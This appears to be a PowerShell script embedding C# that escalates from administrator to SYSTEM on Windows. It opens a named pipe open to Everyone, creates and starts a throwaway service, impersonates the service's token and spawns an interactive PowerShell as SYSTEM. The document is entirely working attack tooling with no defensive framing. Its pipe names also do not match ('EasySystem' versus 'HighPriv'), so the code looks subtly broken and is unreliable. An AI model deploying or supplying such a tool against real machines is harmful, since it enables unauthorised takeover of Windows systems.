$easysystem = @"
using System;
using System.IO;
using System.Text;
using System.IO.Pipes;
using System.Threading;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Runtime.InteropServices;


namespace HighPrivs
{
    public class System
    {
        public class ServiceHelper
        {
            [Flags]
            public enum SCM_ACCESS : uint
            {
                STANDARD_RIGHTS_REQUIRED = 0xF0000,
                SC_MANAGER_CONNECT = 0x00001,
                SC_MANAGER_CREATE_SERVICE = 0x00002,
                SC_MANAGER_ENUMERATE_SERVICE = 0x00004,
                SC_MANAGER_LOCK = 0x00008,
                SC_MANAGER_QUERY_LOCK_STATUS = 0x00010,
                SC_MANAGER_MODIFY_BOOT_CONFIG = 0x00020,
                SC_MANAGER_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED |
                                 SC_MANAGER_CONNECT |
                                 SC_MANAGER_CREATE_SERVICE |
                                 SC_MANAGER_ENUMERATE_SERVICE |
                                 SC_MANAGER_LOCK |
                                 SC_MANAGER_QUERY_LOCK_STATUS |
                                 SC_MANAGER_MODIFY_BOOT_CONFIG
            }

            [Flags]
            public enum SERVICE_ACCESS : uint
            {
                STANDARD_RIGHTS_REQUIRED = 0xF0000,
                SERVICE_QUERY_CONFIG = 0x00001,
                SERVICE_CHANGE_CONFIG = 0x00002,
                SERVICE_QUERY_STATUS = 0x00004,
                SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
                SERVICE_START = 0x00010,
                SERVICE_STOP = 0x00020,
                SERVICE_PAUSE_CONTINUE = 0x00040,
                SERVICE_INTERROGATE = 0x00080,
                SERVICE_USER_DEFINED_CONTROL = 0x00100,
                SERVICE_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
                                  SERVICE_QUERY_CONFIG |
                                  SERVICE_CHANGE_CONFIG |
                                  SERVICE_QUERY_STATUS |
                                  SERVICE_ENUMERATE_DEPENDENTS |
                                  SERVICE_START |
                                  SERVICE_STOP |
                                  SERVICE_PAUSE_CONTINUE |
                                  SERVICE_INTERROGATE |
                                  SERVICE_USER_DEFINED_CONTROL)
            }

            [Flags]
            public enum SERVICE_TYPE : uint
            {
                SERVICE_KERNEL_DRIVER = 0x00000001,
                SERVICE_FILE_SYSTEM_DRIVER = 0x00000002,
                SERVICE_WIN32_OWN_PROCESS = 0x00000010,
                SERVICE_WIN32_SHARE_PROCESS = 0x00000020,
                SERVICE_INTERACTIVE_PROCESS = 0x00000100
            }

            public enum SERVICE_START : uint
            {
                SERVICE_BOOT_START = 0x00000000,
                SERVICE_SYSTEM_START = 0x00000001,
                SERVICE_AUTO_START = 0x00000002,
                SERVICE_DEMAND_START = 0x00000003,
                SERVICE_DISABLED = 0x00000004,
            }

            public enum SERVICE_ERROR
            {
                SERVICE_ERROR_IGNORE = 0x00000000,
                SERVICE_ERROR_NORMAL = 0x00000001,
                SERVICE_ERROR_SEVERE = 0x00000002,
                SERVICE_ERROR_CRITICAL = 0x00000003,
            }

            [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
            public static extern IntPtr OpenSCManager(
                string lpMachineName,
                string lpDatabaseName,
                SCM_ACCESS dwDesiredAccess);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            public static extern IntPtr CreateService(
                IntPtr hSCManager,
                string lpServiceName,
                string lpDisplayName,
                SERVICE_ACCESS dwDesiredAccess,
                SERVICE_TYPE dwServiceType,
                SERVICE_START dwStartType,
                SERVICE_ERROR dwErrorControl,
                string lpBinaryPathName,
                string lpLoadOrderGroup,
                string lpdwTagId,
                string lpDependencies,
                string lpServiceStartName,
                string lpPassword);

            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool CloseServiceHandle(
                IntPtr hSCObject);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            public static extern IntPtr OpenService(
                IntPtr hSCManager,
                string lpServiceName,
                SCM_ACCESS dwDesiredAccess);

            [DllImport("advapi32", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool StartService(
                IntPtr hService,
                int dwNumServiceArgs,
                string[] lpServiceArgVectors);

            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool DeleteService(
                IntPtr hService);


            public static bool CreateNewService(string lpSVCName, string lpSVCCommand)
            {
                IntPtr serviceDbHandle = OpenSCManager(
                        null,                                 // Local computer
                        null,                                 // ServicesActive database 
                        SCM_ACCESS.SC_MANAGER_ALL_ACCESS);    // Full Access rights 

                if (serviceDbHandle == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Failed to connect to the Service Control Manager (SCM).");
                    return false;
                }

                IntPtr schService = CreateService(
                    serviceDbHandle,                          // SCM database 
                    lpSVCName,                                // Name of service 
                    lpSVCName,                                // Service name to display 
                    SERVICE_ACCESS.SERVICE_ALL_ACCESS,        // Desired access 
                    SERVICE_TYPE.SERVICE_WIN32_OWN_PROCESS,   // Service type 
                    SERVICE_START.SERVICE_DEMAND_START,       // Start type 
                    SERVICE_ERROR.SERVICE_ERROR_NORMAL,       // Error control type 
                    lpSVCCommand,                             // Path to service's binary 
                    null,                                     // No load ordering group 
                    null,                                     // No tag identifier 
                    null,                                     // No dependencies 
                    null,                                     // LocalSystem account 
                    null);                                    // No password 

                if (schService == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Failed to Create Service, error: ({0})", Marshal.GetLastWin32Error());
                    CloseServiceHandle(serviceDbHandle);
                    return false;
                }

                Console.WriteLine("[*] Pipe Client Service installed successfully.");

                IntPtr serviceHandle = OpenService(serviceDbHandle, lpSVCName, SCM_ACCESS.SC_MANAGER_ALL_ACCESS);

                Console.WriteLine("[*] Starting Pipe Client Service.");

                StartService(serviceHandle, 0, null);         // Start the Service

                if (!DeleteService(serviceHandle))
                {
                    Console.WriteLine("[!] Failed to remove Service, error: ({0})", Marshal.GetLastWin32Error());
                }

                Console.WriteLine("[*] Removed Pipe Service successfully.");

                CloseServiceHandle(serviceHandle);
                CloseServiceHandle(serviceDbHandle);

                return true;
            }
        }


        public class NamedPipeServerHelper
        {
            public enum TOKEN_ACCESS : uint
            {
                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                STANDARD_RIGHTS_READ = 0x00020000,
                TOKEN_ASSIGN_PRIMARY = 0x0001,
                TOKEN_DUPLICATE = 0x0002,
                TOKEN_IMPERSONATE = 0x0004,
                TOKEN_QUERY = 0x0008,
                TOKEN_QUERY_SOURCE = 0x0010,
                TOKEN_ADJUST_PRIVILEGES = 0x0020,
                TOKEN_ADJUST_GROUPS = 0x0040,
                TOKEN_ADJUST_DEFAULT = 0x0080,
                TOKEN_ADJUST_SESSIONID = 0x0100,
                TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
                TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                                    TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                                    TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                                    TOKEN_ADJUST_SESSIONID)
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct SECURITY_ATTRIBUTES
            {
                public int nLength;
                public IntPtr lpSecurityDescriptor;
                public int bInheritHandle;
            }

            public enum SECURITY_IMPERSONATION_LEVEL
            {
                SecurityAnonymous,
                SecurityIdentification,
                SecurityImpersonation,
                SecurityDelegation
            }

            public enum TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }

            public enum TOKEN_INFORMATION_CLASS
            {
                TokenUser = 1,
                TokenGroups,
                TokenPrivileges,
                TokenOwner,
                TokenPrimaryGroup,
                TokenDefaultDacl,
                TokenSource,
                TokenType,
                TokenImpersonationLevel,
                TokenStatistics,
                TokenRestrictedSids,
                TokenSessionId,
                TokenGroupsAndPrivileges,
                TokenSessionReference,
                TokenSandBoxInert,
                TokenAuditPolicy,
                TokenOrigin,
                TokenElevationType,
                TokenLinkedToken,
                TokenElevation,
                TokenHasRestrictions,
                TokenAccessInformation,
                TokenVirtualizationAllowed,
                TokenVirtualizationEnabled,
                TokenIntegrityLevel,
                TokenUIAccess,
                TokenMandatoryPolicy,
                TokenLogonSid,
                MaxTokenInfoClass
            }

            [Flags]
            public enum CreateProcessFlags : uint
            {
                CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
                CREATE_DEFAULT_ERROR_MODE = 0x04000000,
                DEBUG_PROCESS = 0x00000001,
                DEBUG_ONLY_THIS_PROCESS = 0x00000002,
                CREATE_SUSPENDED = 0x00000004,
                DETACHED_PROCESS = 0x00000008,
                CREATE_NEW_CONSOLE = 0x00000010,
                NORMAL_PRIORITY_CLASS = 0x00000020,
                CREATE_NEW_PROCESS_GROUP = 0x00000200,
                CREATE_NO_WINDOW = 0x08000000,
                CREATE_PROTECTED_PROCESS = 0x00040000,
                CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
                CREATE_SEPARATE_WOW_VDM = 0x00000800,
                CREATE_SHARED_WOW_VDM = 0x00001000,
                CREATE_UNICODE_ENVIRONMENT = 0x00000400,
                EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
                INHERIT_PARENT_AFFINITY = 0x00010000
            }

            [Flags]
            public enum LogonFlags
            {
                LOGON_WITH_PROFILE = 0x00000001,
                LOGON_NETCREDENTIALS_ONLY = 0x00000002
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct STARTUPINFO
            {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool ImpersonateNamedPipeClient(
                IntPtr hNamedPipe);

            [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern bool RevertToSelf();

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern bool CloseHandle(
                IntPtr handle);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentThread();

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenThreadToken(
                IntPtr ThreadHandle,
                TOKEN_ACCESS DesiredAccess,
                bool OpenAsSelf,
                out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool SetThreadToken(
                IntPtr pHandle,
                IntPtr hToken);

            [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern bool DuplicateTokenEx(
                IntPtr hExistingToken,
                TOKEN_ACCESS dwDesiredAccess,
                ref SECURITY_ATTRIBUTES lpTokenAttributes,
                SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                TOKEN_TYPE TokenType,
                out IntPtr phNewToken);

            [DllImport("Kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.U4)]
            public static extern UInt32 WTSGetActiveConsoleSessionId();

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern Boolean SetTokenInformation(
                IntPtr TokenHandle,
                TOKEN_INFORMATION_CLASS TokenInformationClass,
                ref UInt32 TokenInformation,
                UInt32 TokenInformationLength);

            [DllImport("userenv.dll", SetLastError = true)]
            public static extern bool CreateEnvironmentBlock(
                out IntPtr lpEnvironment,
                IntPtr hToken,
                bool bInherit);

            [DllImport("userenv.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool DestroyEnvironmentBlock(
                IntPtr lpEnvironment);

            [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcessWithTokenW(
                IntPtr hToken,
                LogonFlags dwLogonFlags,
                string lpApplicationName,
                string lpCommandLine,
                CreateProcessFlags dwCreationFlags,
                IntPtr lpEnvironment,
                string lpCurrentDirectory,
                [In] ref STARTUPINFO lpStartupInfo,
                out PROCESS_INFORMATION lpProcessInformation);


            public static void NamedPipeServer(object data)
            {
                // Create a Named Pipe to send or receive data
                PipeSecurity ps = new PipeSecurity();
                ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow));
                NamedPipeServerStream pipeServer = new NamedPipeServerStream(
                                                    "EasySystem",
                                                    PipeDirection.InOut,
                                                    dwThreadCount,
                                                    PipeTransmissionMode.Byte,
                                                    PipeOptions.None,
                                                    1024,
                                                    1024,
                                                    ps);

                IntPtr PipeHandle = pipeServer.SafePipeHandle.DangerousGetHandle();
                if (PipeHandle == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Failed to create outbound Pipe instance.");
                    return;
                }

                Console.WriteLine("[*] Waiting for a client to connect to the Pipe.");

                // This call blocks until a client process connects to the Pipe
                pipeServer.WaitForConnection();

                int threadId = Thread.CurrentThread.ManagedThreadId;
                Console.WriteLine("[*] Pipe Client connected on thread ID: {0} -> Reading data from the Pipe.", threadId);

                // Create a StreamReader so we can Read from the Named Pipe
                StreamReader pipeStreamReader = new StreamReader(pipeServer);
                string readFromPipe = pipeStreamReader.ReadLine();

                if (readFromPipe == null)
                {
                    Console.WriteLine("[*] Failed to read data from the Pipe.");
                    return;
                }

                Console.WriteLine("[*] Number of bytes read: {0}", Encoding.ASCII.GetByteCount(readFromPipe) + 2);
                Console.WriteLine("[*] Our buffer contains: {0}\n", readFromPipe);

                // Impersonate the Client.
                if (!ImpersonateNamedPipeClient(PipeHandle))
                {
                    Console.WriteLine("[!] Failed to Impersonate client, error: {0}", Marshal.GetLastWin32Error());
                }

                Console.WriteLine("[*] Impersonate Named Pipe Client.");

                // Get an impersonation token with the client's security context.
                IntPtr hToken = IntPtr.Zero;
                if (!OpenThreadToken(GetCurrentThread(), TOKEN_ACCESS.TOKEN_ALL_ACCESS, true, out hToken))
                    Console.WriteLine("[!] Failed to get Token, error: {0}", Marshal.GetLastWin32Error());

                Console.WriteLine("[*] Get Impersonation Token.");

                // Create an Primary token from our impersonation token
                SECURITY_ATTRIBUTES lpSecurityAttributes = new SECURITY_ATTRIBUTES();
                lpSecurityAttributes.nLength = Marshal.SizeOf(lpSecurityAttributes);
                IntPtr hPrimaryToken = IntPtr.Zero;

                bool result = DuplicateTokenEx(
                    hToken,
                    TOKEN_ACCESS.TOKEN_ALL_ACCESS,
                    ref lpSecurityAttributes,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TOKEN_TYPE.TokenPrimary,
                    out hPrimaryToken);

                if (hPrimaryToken == IntPtr.Zero)
                {
                    Console.WriteLine("[*] Failed Duplicating the Token.");
                    return;
                }

                Console.WriteLine("[*] Create a Primary Token from our Impersonation Token.");

                // Modify token SessionId field to spawn a interactive Processes on the current desktop 
                uint sessionId = WTSGetActiveConsoleSessionId();
                if (!SetTokenInformation(hPrimaryToken,
                        TOKEN_INFORMATION_CLASS.TokenSessionId,
                        ref sessionId,
                        sizeof(UInt32)))
                {
                    Console.WriteLine("[*] Failed to Modify token SessionId.");
                    return;
                }

                // Get all necessary environment variables of logged in user to pass them to the process
                IntPtr lpEnvironment = IntPtr.Zero;
                if (!CreateEnvironmentBlock(out lpEnvironment, hPrimaryToken, true))
                {
                    Console.WriteLine("[*] Failed to create EnvironmentBlock.");
                    return;
                }

                // Start Process with our New token
                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
                STARTUPINFO startupInfo = new STARTUPINFO();
                const int SW_SHOW = 5;
                string szCommandLine = "powershell.exe";

                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "Winsta0\\default";
                startupInfo.wShowWindow = SW_SHOW;

                if (!CreateProcessWithTokenW(
                    hPrimaryToken,
                    LogonFlags.LOGON_WITH_PROFILE,
                    null,
                    szCommandLine,
                    CreateProcessFlags.NORMAL_PRIORITY_CLASS | CreateProcessFlags.CREATE_NEW_CONSOLE | CreateProcessFlags.CREATE_UNICODE_ENVIRONMENT,
                    lpEnvironment,
                    null,
                    ref startupInfo,
                    out processInfo))
                {
                    Console.WriteLine("[!] Failed to Create Process, error: {0}", Marshal.GetLastWin32Error());
                }

                // Destroy Environment Block
                DestroyEnvironmentBlock(lpEnvironment);

                // End impersonation of client
                RevertToSelf();

                //Close Token Handles
                CloseHandle(hPrimaryToken);
                CloseHandle(hToken);

                // Close the pipe (automatically disconnects client too)
                pipeServer.Close();

                return;
            }
        }

        private static int dwThreadCount = 1;

        public static void EasySystemShell()
        {
            
            Console.WriteLine("Getting System Privs.\n");

            if (!WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] For EasySystem you need UAC Elevated Administrator privileges.\n");
                Console.ResetColor();
                return;
            }

            Console.WriteLine("[*] Creating an instance of a Named Pipe.");

            // Creating a MultiThreaded Named Pipe server (In this case only a single Thread)
            uint i;
            Thread[] pipeServers = new Thread[dwThreadCount];
            for (i = 0; i < dwThreadCount; i++)
            {
                // Create Threads for the Clients
                pipeServers[i] = new Thread(NamedPipeServerHelper.NamedPipeServer);
                pipeServers[i].Start();

                Console.WriteLine("[*] Server Thread with ID: {0} created.", pipeServers[i].ManagedThreadId);

                if (pipeServers[i] == null)
                {
                    Console.WriteLine("[!] Create Server Thread failed.");
                    return;
                }
            }

            // Let's Create and Start a Service which should connect to our Pipe
            string lpSVCName = "svcHighPriv";
            string lpSVCCommand = @"%COMSPEC% /C echo 'What uuup!' > \\.\pipe\HighPriv";

            if (!ServiceHelper.CreateNewService(lpSVCName, lpSVCCommand))
            {
                Console.WriteLine("[!] Are you sure you have Administrator permission?");
            }

            // Waiting for Threads to finish
            Thread.Sleep(2000);
            while (i > 0)
            {
                for (int j = 0; j < dwThreadCount; j++)
                {
                    if (pipeServers[j] != null)
                    {
                        if (pipeServers[j].Join(2000))
                        {
                            Console.WriteLine("[*] Server Thread ID: {0} Finished successfully.", pipeServers[j].ManagedThreadId);
                            pipeServers[j] = null;
                            i--; // Decrement the Thread Watch Count.
                        }
                    }
                }
            }

            Console.WriteLine("\n[*] Done\n");

            return;
        }
    }
}
"@

Add-Type -TypeDefinition $easysystem
[HighPrivs.System]::EasySystemShell()
